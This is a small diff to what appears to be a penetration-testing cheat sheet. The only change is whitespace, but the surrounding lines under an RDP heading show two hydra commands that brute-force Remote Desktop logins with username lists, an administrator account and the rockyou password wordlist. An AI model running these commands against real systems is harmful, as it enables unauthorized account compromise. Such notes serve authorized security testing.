@@ -9,7 +9,7 @@
     ```
 
     #### RDP
-    
+
     ```bash
     hydra -V -f -L usernames.txt -P passwords.txt rdp://10.0.2.5 -V
     hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip	
